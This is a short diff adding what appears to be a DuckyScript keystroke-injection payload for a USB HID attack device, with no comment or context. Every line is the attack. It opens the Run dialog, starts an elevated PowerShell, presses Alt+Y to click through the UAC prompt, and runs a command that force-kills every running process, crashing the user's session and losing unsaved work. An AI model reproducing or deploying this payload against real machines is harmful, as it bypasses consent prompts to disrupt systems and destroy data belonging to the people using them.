@@ -1,0 +1,10 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 500
+STRING get-process | stop-process -force
+ENTER
